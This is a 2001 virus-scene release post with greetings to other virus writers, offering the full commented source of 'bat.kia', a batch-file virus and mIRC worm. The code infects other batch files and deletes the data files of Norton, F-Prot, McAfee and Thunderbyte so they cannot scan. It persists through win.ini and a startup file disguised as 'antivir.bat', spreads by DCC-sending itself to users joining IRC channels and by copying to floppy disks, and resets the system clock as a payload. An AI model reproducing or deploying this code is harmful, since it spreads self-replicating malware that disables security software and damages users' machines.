Bat.Kia by philet0ast3r

"Pinoy Virus Writers" proudly presents:

"bat.kia" by philet0ast3r [rRlf]
*********************************

                  000000
                 00000000  00     000000000
                 00    00  00    00000000000
                 00    00  00    00       00
                 00   000  00    00       00
       000000000000000000  00    00       00
    0000000000000000000    00    00      00
  00000          00        000000000000000
 0000          00000000    00000000000000
  0000       00000000000         00
    000      000 00   0000       00
     000   000   00     0000     00
      000 000    00       0000   00
       0000      00         0000 00
        00       00           00000
                 00              00
                 00

             www.rRlf.de

This is my seventh virus (my fifth batch-virus),
and we have got Christmas 2001 now (hohoho).
This one should be released in SallyOne Group E-Zine#1,
but BTK (former owner of SallyOne.com) decided to leave
the scene and let the group die. Well, here we are.
It is my first worm. A batch-worm that spreads through mIRC.
Here are some facts:
-bat-infector
-parasitic
-mIRC worm
-spreads via disks
-autostart-secured win.ini-residency
-retro: F-Prot 95, McAfee, Thunderbyte, Norton AntiVirus 2000
 (it does not recognize the virus, even if heuristic is at
 maximum)
-time-control-payload: sets the date to 23.5.2023 and the time to
 23:17:05,40 on every run
-message-payload: writes the following to c:\programs\bat.kia\bat.kia.inf
 this virus is dedicated to one of the most important persons in my life
 i hope we will never lose ourselves
 ...
 bat.kia by philet0ast3r [rRlf]
-copies itself as call-back to the root-directory
-uses ".."-method to change directories
-fully compatible to Windows ME, Windows 98, Windows 95
 (has been tested)
-size: 2.993 bytes

philet0ast3r likes to gr33t: 3ri5, dr.g0nZo [rRlf], El DudErin0 [rRlf],
Jimmy [rRlf], rastafarie [rRlf], luN4 [rRlf], Zoom23 [PVW], h0axly,
ToxiC, Virus 3000, Kleptic [DoJ], Necronomikon, SnakeByte, Senna Spy,
vortex, Zarrmann, McKeenKiller, pissn3lk [AFN], El Commandante, Julia,
b3rnti, Ernst, fir3nz3 z00l, Mindjuice.

Well, here is the script (with some comments "-->"; have to be
removed for virus to run) ... phile-name should be bat.kia.bat,
but it's not neccessary:

@echo off%_kia%
if '%1=='kia goto kia%2
set kia=%0.bat
if not exist %kia% set kia=%0
if '%kia%==' set kia=autoexec.bat
if exist c:\_kia.bat goto kiag
if exist %kia% goto kiafe
call %kia% kia h %path%
if exist %kia% goto kiafe
goto ekia
:kiah
shift%_kia%
if '%2==' goto kiaxt
if exist %2\%kia% set kia=%2\%kia%
if exist %2%kia% set kia=%2%kia%
if exist %2\%kia%.bat set kia=%2\%kia%.bat
if exist %2%kia%.bat set kia=%2%kia%.bat
if not exist %kia% goto kiah
goto kiaxt
:kiafe
find "kia"<%kia%>c:\_kia.bat
attrib c:\_kia.bat +h
:kiag
command /e:5000 /c c:\_kia kia vir

-->the above is a quite normal infection-routine
-->the hidden call-back-file is also created here

:ekia
ctty nul.kia
if exist c:\_kia.bat del c:\programme\norton~1\s32integ.dll
if exist c:\_kia.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\_kia.bat del c:\programme\mcafee\scan.dat
if exist c:\_kia.bat del c:\tbavw95\tbscan.sig

-->the above is the retro-routine
-->the AVs can not scan without those files

if exist c:\windows\startmen\programme\autostart\antivir.bat goto rdkia
copy bat.kia.bat c:\windows\ki4.sys
echo @echo off>kiaaa.bat
echo ctty nul>>kiaaa.bat
echo if exist c:\windows\system\bat.kia.bat goto 0k>>kiaaa.bat
echo copy c:\windows\ki4.sys c:\windows\system\bat.kia.bat>>kiaaa.bat
echo :0k>>kiaaa.bat
move kiaaa.bat c:\windows\startmen\programme\autostart\antivir.bat

-->the above is the autostart-secure-routine for the residency
-->it checks if the win.ini-residency is still working

-->the below is the residency-routine
-->it infects the win.ini
-->the empty lines are neccessary for wind0ze taking this as true win.ini

:rdkia
if exist c:\windows\system\bat.kia.bat goto wykia
copy bat.kia.bat c:\windows\system
copy bat.kia.bat + c:\windows\win.ini c:\windows\system\win.ini
del c:\windows\win.ini
move c:\windows\system\win.ini c:\windows
goto wykia

[windows]
load=c:\windows\system\bat.kia.bat
run=C:\WINDOWS\SYSTEM\cmmpu.exe
NullPort=None

:wykia
echo [script]>kia23.bat
echo n0=on 1:JOIN:#:{ >>kia23.bat
echo n1= /if ( nick == $me ) { halt } >>kia23.bat
echo n2= /.dcc send $nick c:\windows\system\bat.kia.bat >>kia23.bat
echo n3=} >>kia23.bat
if exist c:\mirc\mirc.ini copy kia23.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy kia23.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy kia23.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy kia23.bat c:\progra~1\mirc32\script.ini
del kia23.bat

-->the above is the worm-routine
-->it makes a mIRC-script-file and places it in a possible mIRC-directory

:dikia
command /f /c copy c:\windows\system\bat.kia.bat a:\

-->the above is a command line, that makes it possible to copy to diskettes
-->there will be no error if there is no disk in drive a:, or if it is writeprotected

:tckia
if exist c:\_kia.bat date 23.05.2023
if exist c:\_kia.bat time 23:17:05,40

-->the lines above are responsible for the time-control-payload

:plkia
if exist c:\programs\bat.kia\bat.kia.inf goto nakia
if exist c:\_kia.bat md c:\programs
md c:\programs\bat.kia
echo this virus is dedicated to one of the most important persons in my life>kia.inf
echo i hope we will never lose ourselves>>kia.inf
echo ...>>kia.inf
echo bat.kia by philet0ast3r [rRlf]>>kia.inf
move kia.inf c:\programs\bat.kia\bat.kia.inf
attrib +s c:\programs\bat.kia\bat.kia.inf

-->the above is the message-payload
-->it writes an inf-file to c:\programs\bat.kia
-->the inf-file has the attribute system-file

:nakia
set kia=
if exist !!kia.bat del !!kia.bat
goto kiaend
:kiaxt
echo.>!!kia.bat
!!kia.bat
:kiavir
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_kia kia i %%a
exit kia
:kiai
find "kia"<%3>nul
if not errorlevel 1 goto kiaj
type c:\_kia.bat>kia$
type %3>>kia$
move kia$ %3>nul
exit kia
:kiaj
set kia!=%kia!%1
if %kia!%==1 exit
:kiaend

-->the above is the rest of the infection-routine